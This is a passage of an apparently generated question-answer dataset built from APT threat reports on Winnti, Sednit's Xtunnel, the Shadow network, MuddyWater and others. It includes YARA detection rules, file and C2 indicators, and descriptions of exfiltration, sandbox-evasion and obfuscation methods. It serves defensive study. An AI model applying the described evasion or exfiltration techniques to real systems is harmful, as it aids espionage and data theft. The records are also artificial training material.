the targeted machines and added log messages to understand what was happening. The logs are stored in\nC:\\ProgramData\\log.txt and some of the log messages are:\ngetting drives\u2026\nstart erasing physical drives\u2026\n\u2013\u2013 start erasing logical drive\nstart erasing system physical drive\u2026\nsystem physical drive \u2013\u2013 FAILED\nstart erasing system logical drive\nBig Headline: Conclusion\nThis report details a destructive cyberattack that impacted Ukrainian organizations on February 23rd, 2022, and a second attack that affected a different Ukrainian organization from February 24th  through 26th, 2022. At this point, we have no indication that other countries were targeted.\nHowever, due to the current crisis in Ukraine, there is still a risk that the same threat actors will launch further campaigns against countries that back the Ukrainian government or that sanction Russian entities.\n\nAnswer this question based on the above context: What evidence suggests that IsaacWiper might have been used in previous operations before its appearance in telemetry on February 24th, 2022? How does this information help in understanding the potential timeline and sophistication of the attack?",
    "output": "The oldest PE compilation timestamp found for IsaacWiper is October 19th, 2021. If this timestamp has not been tampered with, it indicates that IsaacWiper might have been used in previous operations months earlier. This information helps in understanding that the attack could have been planned well in advance, suggesting a level of preparation and potentially ongoing activity that predates the known attacks. Additionally, the lack of code similarity with HermeticWiper and its less sophisticated nature, despite the timeline overlap, hint at a possible relationship but without strong connections identified yet.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: CODE REUSE\nThe authors of Winnti are clearly proponents of the open-source software movement, as large chunks of the worker binary consist of open-source software packages. The authors statically linked in the OpenSSL library (version 0.9.8x),3 the LZMA compression library,4 the nedalloc memory allocation library,5 and the Zlib library (version 1.2.7).6 As for the part of the code that generates the unique identifier for the victim's computer, the authors of the worker component lifted the code DISKID32,7 which is an open-source utility for reading the manufacturer data from a hard drive. The DISKID32 package is a surprisingly obscure piece of software from a company in Texas that writes an industrial process simulator that has \"over 1,000 active users.\"8\n3 ftp://ftp.openssl.org/source/old/0.9.x/openssl-0.9.8x.tar.gz. 10 May 2012.\n4 http://sourceforge.net/projects/sevenzip/files/LZMA%20SDK/lzma922.tar.bz2/download. 18 April 2010. 5 Niall Douglas. \"nedalloc Homepage\". http://www.nedprod.com/programs/portable/nedmalloc/. 5 December 2014.\n6 Jean-loup Gailly and Mark Adler. \"zlib\". http://zlib.net/. 26 March 2014.\n7 WinSim, Inc. \"DISKID32 (FREEWARE)\". https://www.winsim.com/diskid32/diskid32.html. Accessed 1 December 2014.\n8 WinSim, Inc. \"About WinSim\". https://www.winsim.com/index.html. Accessed 1 December 2014.\nThe basis for the worker component is a library called RemoteLib. Some earlier variants of version 3.0 of Winnti contain debugging output that references the RemoteLib library. RemoteLib does not appear to be a publically available piece of software but does appear to be actively maintained, as evident by the gradual refinements seen between the 32-bit and 64-bit variants of version 3.0 of Winnti.\nThe compilation of the full OpenSSL library into the worker component solely for implementing HTTPS results in a significant size increase. Approximately 60 percent of the worker component is made up of OpenSSL functions when only a small fraction (less than 1 percent) of the OpenSSL library is actually used by the worker component.\nMedium Headline: SERVICE  DESCRIPTION\nMonitoring of hardwares and automatically updates the device drivers\nFrom a file system perspective, it is possible to identify Winnti infections by looking for the following filenames:\n\u2022 %SYSDIR%\\otfkty.dat\n\u2022 %SYSDIR%\\wmtsk.dll\n\u2022 %SYSDIR%\\wmm2.dat\nGiven that Winnti will alter the time stamp of files to match that of the victim's cmd.exe file, looking for files with the exact same time as the victim's cmd.exe may identify other foreign files on the victim's system that warrant inspection and possible isolation.\nNovetta established the following YARA signatures for detecting the various components of version 3.0 of the Winnti malware; administrators are advised to use these signatures to help detect and remediate active version 3.0 Winnti infections.\nrule Winnti_Dropper {\nmeta: copyright = \"Novetta Solutions\" author = \"Novetta Advanced Research Group\" strings: $runner = \"%s\\\\rundll32.exe \\\"%s\\\", DlgProc %s\"\n$inflate = \"Copyright 1995-2005 Mark Adler\"\ncondition:\n$runner and $inflate\n}\nrule Winnti_service\n{ meta: copyright = \"Novetta Solutions\" author = \"Novetta Advanced Research Group\" strings: $newmem = \"new memory failed!\" $value = \"can not find value %d\\n\" $onevalue = \"find one value %d\\n\" $nofile = \"Can not open the file (error %d)\" condition: 3 of ($newmem, $value, $onevalue, $nofile)\n}\nrule Winnti_engine { meta: copyright = \"Novetta Solutions\" author = \"Novetta Advanced Research Group\" strings: $api1 = \"SHCreateItemFromParsingName\" $datfile = \"otfkty.dat\" $workstart = \"work_start\"\n$workend = \"work_end\"\n}\ncondition: ($api1 or $datfile) and ($workstart and $workend)\nrule Winnti_worker { meta: copyright = \"Novetta Solutions\" author = \"Novetta Advanced Research Group\" strings:\n$pango = \"pango-basic-win32.dll\"\n$tango = \"tango.dll\" $dat = \"%s\\\\%d%d.dat\"\n$cryptobase = \"%s\\\\sysprep\\\\cryptbase.dll\"\ncondition:\n$pango and $tango and $dat and $cryptobase\n}\n\nQuestion: How does the use of open-source libraries in the Winnti worker binary impact its functionality and detection? Why might attackers choose to include these libraries, and what are the implications for defenders?\n\nAnswer:",
    "output": "The use of open-source libraries in the Winnti worker binary significantly impacts its functionality and detection. The authors of Winnti included libraries such as OpenSSL, LZMA, nedalloc, Zlib, and DISKID32. These libraries provide essential functionalities like encryption (OpenSSL), compression (LZMA, Zlib), memory allocation (nedalloc), and unique identifier generation (DISKID32). Attackers might choose to include these libraries to leverage well-tested and reliable code, reducing development time and effort. However, this approach increases the binary size, with approximately 60 percent of the worker component consisting of OpenSSL functions, even though less than 1 percent is actually used. For defenders, the inclusion of open-source libraries can aid in detection, as known library signatures can be identified during analysis. Additionally, understanding the specific libraries used can provide insights into the malware's capabilities and potential indicators of compromise.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does DW20.exe, the installation executable file in the Terminator RAT attack, evade sandbox automatic analysis? Describe the process and explain why this method is effective.",
    "output": "DW20.exe evades sandbox automatic analysis by deleting and terminating itself after installation. The malware will only run after a reboot. This method is effective because malicious activity is delayed until after the system reboots, which means it won't be detected during the initial analysis phase in a sandbox environment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Protection and mitigation\nFor all regular client computers, the well-established best practice guidelines apply. These computers are often the first ones to be attacked. Once compromised, the attacker will use these computers and try to explore deeper into internal networks. Securing and hardening of deployed operating systems with a working strategy for patch deployment is important. Reoccurring security awareness training can help users to identify social engineering attempts and prevent them from falling victim to them in the first place.\nThe company can perform penetration testing on Web and network applications but also on ICSs to identify and remedy any vulnerability. For examples Web applications should be tested against SQL injection attacks. This can also help confirm if applied polices are followed through, if the patch level is correct on all computers and if systems are compliant.\nCompanies can monitor the Internet for information about attacks in the same vertical and apply lessons learned where possible.\nIn addition, different layers of security products can help achieve better overall protection.\n\u2022 Security Information and Event Manager system (SIEM): Using a SIEM can help correlate all related alerts in one place. This centralized view can be cross referenced with threat intelligence data to generate prioritization and an action plan. Painting the bigger picture of the overall security state can reveal previously unnoticed attacks. For example failed login attempts on internal servers could indicate a password breach. This includes logging of critical systems and synchronization of time among multiple systems.\n\u2022 Ingress and egress filtering: Filtering the network traffic with firewalls, content filters and IPS allows the control of data flows. This can prevent attackers from reaching internal systems. It is important to also monitor outbound traffic, as data exfiltration is a key point for cyberespionage. It should be noted that with the increased use of cloud services and mobile devices, some traffic might never pass through the company's gateways. Where traffic blocking is too disruptive at least monitoring should be implemented.\n\u2022 Data loss prevention (DLP): DLP solutions can track the access and flow of critical information and prevent it from leaving the company or encrypt it automatically.\n\u2022 Endpoint protection: Depending on the usage pattern of the computer, different solutions are available to protect the endpoint. Antivirus solution with proactive detection methods like behavioral analysis and reputation scanning can prevent unknown malware from installing itself. HIPS (host based intrusion prevention systems), behavioral lockdown or whitelisting can protect computers from any kind of unwanted tampering without the need of constant updates.\n\u2022 System protection: For non-standard IT systems, hardening can increase the security. On industrial systems which are not often updated or that cannot be updated, exploitation can be prevented with the help of lockdown solutions like Symantec Critical System Protection (CSP). Through policies, only trusted system applications are allowed to run. ICS should be regularly checked and upgraded if new firmware exists. Where this is not possible HIPS and behavioral lockdown tools can be used to secure computers.\n\u2022 Email filtering: Proper email filtering can prevent many spear phishing attempts from reaching users. They can help minimize the risk of an untrained user falling for social engineering tricks.\n\u2022 Authentication: Some of the ICS contain hardcoded passwords and, wherever possible, these should be changed. ICS frequently use weakly authenticated protocols that allow for impersonation attacks. Where possible those authentication methods should be upgraded or at least closely monitored. Strong authentication or PKI should be used where applicable.\nIndustrial control systems (ICS) should be specially protected and monitored. The control system and control network should be secured. Where possible, ICS should be separate from the Intranet. Isolating these networks alone is often not enough to protect the control network, but it can make it more difficult for attackers to succeed. For some systems it can make sense to have a plan to quickly disconnect or separate critical machines in the event of a detected cyberattack.\n\nBased on the above text, answer a question. How can a Security Information and Event Manager (SIEM) system enhance the overall security posture of an organization, particularly in the context of protecting against targeted attacks like those faced by the energy sector?",
    "output": "A Security Information and Event Manager (SIEM) system can enhance the overall security posture of an organization by correlating all related alerts in one place. This centralized view can be cross-referenced with threat intelligence data to generate prioritization and an action plan. By painting the bigger picture of the overall security state, a SIEM can reveal previously unnoticed attacks. For example, failed login attempts on internal servers could indicate a password breach. This includes logging of critical systems and synchronization of time among multiple systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did Suck\u00d3y leverage open-source information to facilitate their initial breach into the e-commerce company's internal network?",
    "output": "Suck\u00d3y identified a user to target by leveraging open-source information. The targeted employee had a significant online presence, including details about their job function, corporate email address, work-related projects, and a publicly accessible personal blog. This information likely facilitated the initial breach, potentially through a spear-phishing email, although the exact delivery vector is unknown.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: PART 3: Mapping the Shadows in the Cloud\nIn order for us to begin to map the Shadows in the Cloud, it was important for us to have clear starting points. The first and easiest starting point that we identified was to look back at what was related to and still operational from the previous Tracking GhostNet report. We focused primarily on the domains described in GhostNet and set out to see what we could learn from them in their current state. The second was to continue collecting and analyzing information on attacks gleaned from field research and reports that were shared with us by third-parties. Each of these starting points branched off from one another and crossed paths in various ways, revealing at least two distinct cyber espionage networks.\nWe previously mentioned that a large portion of the domain names mentioned in Tracking GhostNet went offline following the initial report. As a result, several of the domain names described in it were abandoned. The domains ultimately expired and were available for re-registration. This gave us the opportunity to take over these domains and monitor any connections that might come to them. Doing this allowed us to see connections from victims that were still infected, and learn more about how the command and control server was configured. The Shadowserver Foundation has utilized this technique for a long time (Higgins 2008).\nThe investigation was broadened further when field research by the Information Warfare Monitor crossed paths with research being done by the Shadowserver Foundation. The field research revealed that a computer system in the OHHDL had been compromised by at least two different types of malware associated with targeted malware intrusions. Based on our understanding of the malware, the domains and on-going research, we assess that this compromise also involved at least two different cyber espionage groups and potentially even a third one. Analysis of several malware components and their associated command and control servers ultimately led to the discovery of an accessible drop zone for documents being siphoned off compromised systems.\nThe attackers' command and control infrastructure is a critical component of maintaining persistent access to compromised computers. Through this infrastructure, the attackers issue commands to the compromised machines as well as exfiltrate data to drop zones or to the command and control servers themselves. By carefully examining the relationships between command and control servers we were able to map out the extent of one such network and link it with other similar malware networks.\nThis report focuses on only one of these networks, one that we have named the Shadow network. This is a complex network that leveraged social networking websites, webmail providers, free hosting providers and services from some of the largest companies on the Internet as disposable command and control locations. The first layer of control used blogs, newsgroups, and social networking services to maintain persistent control as these system are unlikely to be detected as malicious. As compromised computers accessed these services, they received another command and control location, often located on free web hosting providers. The command and control servers on the free hosting services are often disabled over time \u2013 most likely due to reports of malicious activity. When the command and control servers on free web hosting services were disabled, the compromised systems would receive commands from the social networking layer and then beacon (i.e., attempt a connection) to a more stable inner core of dedicated systems located in the PRC. Unlike the command and control servers on free web hosting services, these dedicated servers hosted in the PRC have proven to be quite stable over time.\nMedium Headline: 3.1 Analysis of Data while in the Field\nDuring the field investigation we collected samples of network traffic from computers at the OHHDL and other Tibetan-related locations. Inspection of network traffic from these computers revealed that at least three of them were compromised and were communicating with the same set of command and control servers. The traffic analysis revealed that these systems were all connecting to the domain jdusnemsaz.com. At the time it resolved to the IP address 119.84.4.43, which is assigned to China Telecom in the province of Chongqing, PRC. The commands sent by the command and control server were identical to malware we found at the Tibetan NGO Drewla and the OHHDL during our GhostNet investigation a year earlier, although were not part of the network that was described in that initial report.\nThere is a similarity between the commands sent by the command and control server jdusnemsaz.com and a previously identified control server, lookbytheway.net. In both cases, the network traffic captured from the compromised computers revealed that the malware was exfiltrating sensitive documents.\nTable 1: Command and Control: Similarities with previous attacks\nFurther analysis of the network traffic also revealed that at least one of the systems was infected with additional malware not associated with the aforementioned command and control servers.  The system was attempting DNS resolutions of multiple hostnames. Two of the hostnames resolved to IP addresses but were not available when the system attempted to communicate to them. The other hostname did not resolve at all.\nThe failed DNS resolution was for www.assam2008.net, which is a domain that has been used by a different group of attackers in the past in conjunction with the Enfal trojan, and suggests a limited connection between the current malware under investigation and malware used in previous attacks on other targets. This domain name was available for registration and was added to our ongoing sinkhole project.\nWhile recording network traffic in the field, we observed the attackers removing two senstive documents from the OHHDL (see fig. 1, page 15). The data was compressed using CAB, split into 100kb chunks when necessary, encoded with base64, and then uploaded to a command and control server. In this case, data was being uploaded to c2etejs.com, which is hosted on the same IP address (119.84.4.43) as jdusnemsaz.com.\nWe reconstructed the documents that were exfiltrated from the OHHDL: \"letters - current.doc\" and \"letters - master 2009.doc (see fig. 2, page 15).\" The documents contained over 1,500 letters sent from the Dalai Lama's office between January and November 2009. While many of the letters are perfunctory \u2014 responses to various invitations and interview requests \u2014 they allow the attackers to collect information on anyone contacting the Dalai Lama's office. Moreover, there are some communications contained within these documents that could be considered sensitive, such as communications between the OHHDL and Offices of Tibet around the world. Some communications contain generic information of the Dalai Lama's travelling details including schedule of appearances \u2013 but very little that could not be established through open sources and publicly available information on the internet.\nMedium Headline: 3.2 Technical Investigation\nDuring the technical investigation we examined the data collected from the field, third-party sources, and from our DNS sinkhole project in order to determine the attack vectors used to exploit and compromise the victims. While we were unable to determine how any one individual computer came to be compromised, we documented a variety of exploits used by the attackers. We mapped out the broader command and control infrastructure by discovering new pieces of malware located on servers that we identified, and catalogued any new servers that these instances of malware were configured with. We also looked at domains that were co-hosted on the same servers we had already identified, and used searches to identify Twitter, Google Groups, Blogspot, Baidu Blogs, blog.com, and Yahoo! Mail accounts that were misused by the attackers to update compromised computers with new command and control locations. We also discovered a panel or listing of compromised computers. During our investigation into one of the servers we made a significant discovery: we were able to recover data that was being exfiltrated by the attackers from compromised computers. These documents were only available on the command and control server for a short time after being uploaded by the compromised systems, as the attackers frequently removed them at irregular time intervals.\nQ: During the field investigation, what specific malware behaviors were observed on the compromised systems at the OHHDL? How did the researchers analyze the network traffic to identify these behaviors?",
    "output": "During the field investigation, researchers collected samples of network traffic from computers at the OHHDL and other Tibetan-related locations. They observed that at least three of these systems were compromised and communicating with the same set of command and control servers, specifically the domain jdusnemsaz.com, which resolved to an IP address assigned to China Telecom in Chongqing, PRC. The commands sent by the command and control server were identical to malware found during the GhostNet investigation a year earlier. The network traffic analysis revealed that the malware was exfiltrating sensitive documents. Additionally, one of the systems was infected with additional malware not associated with the aforementioned command and control servers, attempting DNS resolutions of multiple hostnames, some of which resolved to IP addresses but were not available when the system tried to communicate with them.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: TLS Encryption (April 2014)\nA major feature introduced in April 2014 is the encryption of the communications with the C&C server with the Transport Layer Security (TLS) protocol (<>)[25]. These new Xtunnel binaries are statically linked with OpenSSL 1.0.1e \u2014 a version released in February 2013. Inside the TLS encapsulation, Xtunnel network protocol for tunneling remains the same (including the RC4 encryption).\nThe TLS certificate used by the C&C server is not verified by Xtunnel, which means anyone could play the role of Xtunnel C&C server.\nSmall Headline: HTTP Proxy Connection (February 2015)\nSome organizations force their computers to pass through an HTTP proxy to access the Internet. Malware running on such machines therefore cannot contact the C&C server directly, but has to pass through the proxy. Sednit developers took that into account by creating special Xtunnel versions with HTTP proxy awareness.\nIn these binaries, Xtunnel first tries to retrieve the Internet Explorer proxy configuration by calling the Windows API function WinHttpGetIEProxyConfigForCurrentUser (<>)[26]. In the event that no information can be retrieved, it uses the hardcoded address 10.1.1.1:8080, which is the default address of the Squid caching proxy (<>)[27]. This intention is clearly stated in the PDB path in one of the samples: xaps_through_squid_default_proxy.\nOnce a proxy IP address has been chosen, Xtunnel uses the HTTP CONNECT method (<>)[28] to reach its C&C server.\nSmall Headline: Command Line Parameter Parser (April 2015)\nTo gain in flexibility and manage novel features, in April 2015 Xtunnel developers introduced a command line parameter parser. This parser accepts the parameters described in Table 5.\nTable 5. Xtunnel Parameters\nIn most Xtunnel samples, the parser actually processes a command line hardcoded in the binary, without even looking for input parameters. Here are some examples of such command lines found in some samples:\nThe proxy IP addresses shown in these examples do not correspond to any known default proxy address, indicating that these binaries were likely compiled for specific targets.\nSmall Headline: HTTP Persistent Connection (June 2015)\nIn June 2015, a novel way to connect to the C&C server was introduced: an HTTP persistent connection (<>)[29]. When this feature is enabled, Xtunnel exchanges data with its C&C server over the HTTP protocol (encapsulated in TLS protocol), probably as a way to bypass firewalls.\nTo open such a persistent connection, an HTTP GET request is encapsulated in TLS protocol and sent to the C&C server. This request comes with the HTTP header Connection: keep-alive to enable the persistent connection.\nAnother HTTP request header hardcoded in Xtunnel is Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4, which interestingly contains the language code ru-RU. This header may have been copied from a request made from a computer whose default language is Russian.\nSmall Headline: Code Obfuscation (July 2015)\nIn July 2015, Xtunnel binaries changed drastically from a syntactic point of view, due to the introduction of code obfuscation. This obfuscation was applied only to Xtunnel-specific code, while statically linked libraries were left untouched. The method employed is a mix of classic obfuscation techniques, like insertion of junk code and opaque predicates (<>)[30].\nConsequently, Xtunnel binaries are now about 2 MB in size, while the previous non-obfuscated versions were about 1 MB with most of that being the statically linked OpenSSL library. The obfuscated version is, of course, much harder to understand and, to illustrate that, the following Figures show the control flow graph (CFG) (<>)[31] of a small Xtunnel function, before and after obfuscation.\nWhile the control flow has been heavily obfuscated, strangely the strings and data are kept in plain text. We speculate that the developers applied an (unknown) code obfuscation tool, which was enough to achieve their goal \u2014 probably bypassing some security products.\nMedium Headline: Conclusion and Open Questions\nWe believe Xtunnel to be of high importance to the Sednit operators, despite the questionable quality of the code as we discussed in the analysis. In particular, it is the only Sednit component we know with heavy code obfuscation. Additionally, the numerous features added over the last three years indicate an ongoing development effort.\nFinally, we would like to stress that our analysis is solely based on the capabilities found in the binaries. In particular, we do not have in-the-wild examples on how Xtunnel is deployed, and what kind of network traffic is usually forwarded.\nBig Headline: ClOSInG REMaRkS\nIn order to perform its espionage activities, the Sednit group mainly relies on two backdoors, Xagent and Sedreco, which were intensively developed over the past years. Similarly, notable effort has been invested into Xtunnel, in order to pivot in a stealthy way. Overall, these three applications should be a primary focus to anyone wanting to understand and detect the Sednit group's activities.\nNevertheless, the spying and pivoting capabilities of Sednit are not limited to the software described in this second part of our whitepaper. For example, they regularly deploy the following on target computers:\n\u2022 Password retrieval tools for browsers and email clients; some of these tools are custom, while others are publicly available (like the SecurityXploded tools (<>)[32])\n\u2022 Windows password retrieval tools, with custom builds of the infamous mimikatz (<>)[33] and some custom tools\n\u2022 A custom tool to take regular screenshots of the target computer\nMoreover, the Sednit group created numerous small executables to perform specific tasks, like copying or removing files. The developers seem therefore to closely follow the operational needs of the group, causing us to speculate that they are not outsiders paid for a one-time job, but fully-fledged members of the group.\nBig Headline: REfEREnCES\n1. The Washington Post, Russian government hackers penetrated DNC, stole opposition research on Trump, (<https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0_story.html?hpid=hp_rhp-banner-main_dnc-hackers-1145a-banner%3Ahomepage%2Fstory,>), June 2016\n2. The Wall Street Journal, Germany Points Finger at Russia Over Parliament Hacking Attack, , May 2016\n3. Reuters, France probes Russian lead in TV5Monde hacking: sources, -france-russia-cybercrime-idUSKBN0OQ2GG20150610, June 2015\n4. ESET VirusRadar, Zero-day, -day\n5. ESET, Sednit Espionage Group Attacking Air-Gapped Networks, , November 2014\n6. Kaspersky, Sofacy APT hits high profile targets with updated toolset, -apt-hits-high-profile-targets-with-updated-toolset/, December 2015\n7. CrowdStrike, Bears in the Midst: Intrusion into the Democratic National Committee, -midst-intrusion-democratic-national-committee/, June 2016\n8. Trend Micro, Pawn Storm Espionage Attacks Use Decoys, Deliver SEDNIT, , October 2014\n9. FireEye, APT28: A Window into Russia's Cyber Espionage Operations?,\n10. GitHub, ESET Indicators of Compromises,\n11. ESET, Sednit espionage group now using custom exploit kit, , October 2014\n12. Microsoft Developer Network, Run-Time Type Information,\n13. Trend Micro, Pawn Storm Update: iOS Espionage App Found, -storm-update-ios-espionage-app-found/, February 2015\n14. 15. SQLite, SQLite, /\n16. Wikipedia, Cyclic redundancy check,\n17. W3C, The Multipart Content-Type,\n18. Microsoft Developer Network, How to Implement Icon Overlay Handlers, (v=vs.85).aspx\n19. Microsoft Developer Network, SYSTEMTIME structure, (v=vs.85).aspx\n20. Wikipedia, Lempel\u2013Ziv\u2013Welch, %E2%80%93Ziv%E2%80%93Welch\n21. 4coder, LZW Algorithm Implementation, /\n22. 23. Spiegel, Cyberangriff auf das Parlament: Bundestag best\u00e4tigt Abfluss von E-Mail-Daten, , June 2015\n24. PDB Files,\n25. Internet Engineering Task Force, The Transport Layer Security (TLS) Protocol,\n26. Microsoft Developer Network, WinHttpGetIEProxyConfigForCurrentUser function, (v=vs.85).aspx\n27. Squid, Home Page, /\n28. Wikipedia, HTTP CONNECT tunneling, #HTTP_CONNECT_tunneling\n29. Wikipedia, HTTP persistent connection,\n30. Wikipedia, Opaque predicate,\n31. Wikipedia, Control flow graph,\n32. SecurityXploded, Home Page, /\n33. mimikatz, GitHub page,\nLast updated 2016-09-07 19:38:00 EDT\n\nHow did the Sednit group modify Xtunnel in June 2015 to potentially bypass firewalls, and what additional clue did they leave behind regarding their possible origin?",
    "output": "A: In June 2015, the Sednit group introduced a feature in Xtunnel to establish an HTTP persistent connection with the C&C server. This connection is encapsulated in the TLS protocol and uses the HTTP GET request with the header 'Connection: keep-alive' to maintain the persistent connection, likely as a method to bypass firewalls. Additionally, another HTTP request header hardcoded in Xtunnel is 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4', which includes the language code 'ru-RU'. This suggests that the request might have been copied from a computer whose default language is Russian, providing a clue about the possible origin of the Sednit group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 3. Cyber Reconnaissance and Attack\nNCW, IO, FCS, and Informationization are not identical to cyber attack and cyber reconnaissance; however they significantly overlap. The first four, discussed above, tend to deal with the hi-tech advancement of traditional military assets, PSYOPS, and media warfare \u2013 all of which rely on the internet in some form. The lexicon is continuing to develop, having at times included the terms: total dimensional warfare, expeditionary forces, command and control warfare, information warfare, full spectrum dominance, and electronic warfare. Cyber attack may be thought of as hacking with the intent to destroy or disrupt. This could include the physical destruction of a computer, deleting/re-writing of files, or knocking a network or service offline. Cyber reconnaissance is the collection of data, also known as cyber espionage or network intrusion. This may include technology transfer or intelligence, such as troop locations or weaknesses that could be used in an attack. In many cases a hacker goes from reconnaissance to attack at will. Here all six will be addressed \u2013 NCW, IO, FCS, Informationization, Cyber Attack, and Cyber Reconnaissance - as components of cyber warfare (China's Proliferation Practices, and the Development of Its Cyber and Space Warfare Capabilities 2008).\nThis section will examine cyber reconnaissance with an emphasis on Chinese examples and military applications. In addition to China's stated goal of informationization and the quasi-officially endorsed book, Unrestricted Warfare, this section will show that foreign allegations\nand widespread network intrusions suggest China is developing a cyber warfare capability.  Cyber warfare fits with China's established patterns of asymmetry and technology transfer. In order to grasp why Beijing would pursue cyber warfare as a means of leapfrogging, it is essential to acknowledge the skills of hacking. Hackers utilize a wide range of tools with highly sophisticated techniques, the scope of which is beyond this article; however some basic understanding is necessary. Hacking is capable of causing massive damage with little funding, it is difficult to detect and defend against, it provides a high level of deniability, and it eliminates the problem of geographical distance.\n\nWhat are the key components of cyber warfare as discussed in the context of China's military strategy, and how do they overlap with other military concepts such as Network Centric Warfare (NCW), Information Operations (IO), Future Combat Systems (FCS), and Informationization?",
    "output": "The key components of cyber warfare discussed in the context of China's military strategy include Cyber Attack and Cyber Reconnaissance. These components overlap with other military concepts such as Network Centric Warfare (NCW), Information Operations (IO), Future Combat Systems (FCS), and Informationization. While these concepts deal with the hi-tech advancement of traditional military assets, PSYOPS, and media warfare, cyber warfare specifically involves hacking with the intent to destroy or disrupt (Cyber Attack) and the collection of data through network intrusion (Cyber Reconnaissance). This includes activities like technology transfer, intelligence gathering, and identifying weaknesses that could be exploited in an attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Lazarus group's use of a Trojanized DeFi application relate to Phishing: Spearphishing Attachment tactics?",
    "output": "Phishing: Spearphishing Attachment is a tactic where adversaries send targeted emails with malicious attachments to gain access to victim systems. In the case of the Lazarus group's Trojanized DeFi application, it is suspected that the initial infection vector was a spear-phishing email or social media contact that tricked the victim into executing the malicious application. Although the exact method of delivery is unclear, the use of a Trojanized application that appears to be a legitimate DeFi Wallet program is consistent with the tactics used in Phishing: Spearphishing Attachment. The attackers likely relied on social engineering techniques to convince the victim to open and execute the malicious application, which would then install a full-featured backdoor on the victim's system. The fact that the malware is designed to communicate with a C2 server and receive further instructions also suggests that the attackers intended to use the malware to gain long-term access to the victim's system, which is a common goal of Phishing: Spearphishing Attachment attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: MuddyWater likely comprised of multiple sub-groups\nWe assess that MuddyWater is a conglomerate of smaller teams, with each team using different targeting tactics against specific regions of the world. They appear to share some techniques and evolve them as needed. This sharing is possibly the result of contractors that move from team to team, or the use of the same development and operational contractors across each team. The latter also explains why we have seen simple indicators such as unique strings and watermarks shared between MuddyWater and the Phosphorus (aka APT35 and Charming Kitten) APT groups. These groups are attributed to different Iranian state organizations \u2014 the  and , respectively.\nBased on new information and a review of MuddyWater threat activity and TTPs, we can link together the attacks covered (<https://blog.talosintelligence.com/2022/01/iranian-apt-muddywater-targets-turkey.html>)in our January 2022 MuddyWater blog with this most recent campaign targeting Turkey and other Asian countries. The graphic below shows the overlap in TTPs and regional targeting between the various MuddyWater campaigns, which suggests these attacks are distinct, yet related, clusters of activity. While some campaigns initially appeared to leverage new TTPs that seemed unrelated to other operations, we later found that they instead demonstrated a broader TTP-sharing paradigm, typical of coordinated operational teams.\nTracing MuddyWater's activity over the last year, we see that some of the shared techniques seem to be refined from one region to the other, suggesting the teams use their preferred flavors of tools of choice, including final payloads. The above timeline also shows the incremental usage of certain techniques in different campaigns over time, suggesting that they are tested and improved before being implemented in future operations.\nThe first two techniques we see being implemented and then shared in future operations are signaling tokens and an executable dropper. We first observed the usage of tokens for signaling in April 2021 in a campaign against Pakistan via a simple dropper that downloads the \"Connectwise\" remote administration tool. Later, in June, we see the first usage of the executable dropper against Armenia (described in detail in our previous post). The dropped payload is a PowerShell script that loads another PowerShell script that downloads and executes a final PowerShell-based payload.\nThe two techniques were then combined later in August 2021 in a campaign targeting Pakistan, this time still using the homemade tokens. Later, the actors graduated to a more professional implementation of the token by using canarytokens[.]com's infrastructure. canarytokens[.]com is a legitimate service that MuddyWater uses to make their operations appear less suspicious. These techniques were next leveraged in a November 2021 campaign targeting Turkey in the campaign we described in our January blog. In these attacks on Turkey, MuddyWater used maldocs with tokens and the same executable droppers previously seen targeting Armenia and Pakistan.\nIn March 2021, we observed MuddyWater using the (<https://github.com/sysdream/ligolo>)Ligolo reverse-tunneling tool in attacks on Middle Eastern countries. This tactic was later reused in December 2021, along with the introduction of a new implant. Beginning in December 2021, we observed MuddyWater using a new WSF-based RAT we named \"SloughRAT\" to target countries in the Arabian Peninsula, which is described in more detail later in this blog. During our investigation, we discovered another version of SloughRAT being deployed against entities in Jordan. This attack included (<https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html>)the deployment of Ligolo \u2014 a MuddyWater tactic also corroborated by Trend Micro in  \u2014 following the deployment of SloughRAT.\nAll these attacks show an interesting pattern: Multiple commonalities in some key infection artifacts and TTPs, while retaining enough operational distinctions. This pattern can be broken down into the following practices:\nThe introduction of a TTP in one geography, a delay of typically two or three months, then the reuse of that same TTP in a completely different geography, alongside other proven TTPs borrowed from campaigns conducted in another geography.\nThe introduction of at least one new TTP completely novel to MuddyWater's tactics in almost every geographically distinct campaign.\nThese observations strongly indicate that MuddyWater is a group of groups, each responsible for targeting a specific geography. Each is also responsible for developing novel infection techniques while being allowed to borrow from a pool of TTPs tested in previously separate campaigns.\nMedium Headline: Tying together previous MuddyWater campaigns\nIn our previous post, we disclosed two campaigns using the same types of Windows executables \u2014 one targeting Turkey in November 2021 and one from June 2021 targeting\nArmenia. Another campaign illustrated previously used similar executables, this time to target Pakistan. This campaign deployed a PowerShell-based downloader on the endpoint to accept and execute additional PS1 commands from the C2 server.\nGoing further back, in April 2021, we observed another instance of Muddywater targeting entities in Pakistan, this time with a maldoc-based infection vector. The lure document claimed to be part of a court case, as the image below shows.\nMalicious lure containing a blurred image of the state emblem of Pakistan and referring to a court case.\nIn this case, however, the attackers attempted to deploy the Connectwise Remote Access client on the target's endpoints, a tactic commonly used by MuddyWater to gain an initial foothold on targets' endpoints.\nIn the attacks deploying the RAT in April 2021 and the EXE-based infection vector from August 2021, the maldocs and decoy documents reached out to a common server to download a common image file that links them.\nThese campaigns used a homemade implementation of signaling tokens. In this case, the maldocs have an external entity downloaded from an attacker-controller server. This entity consists in a simple image which has no 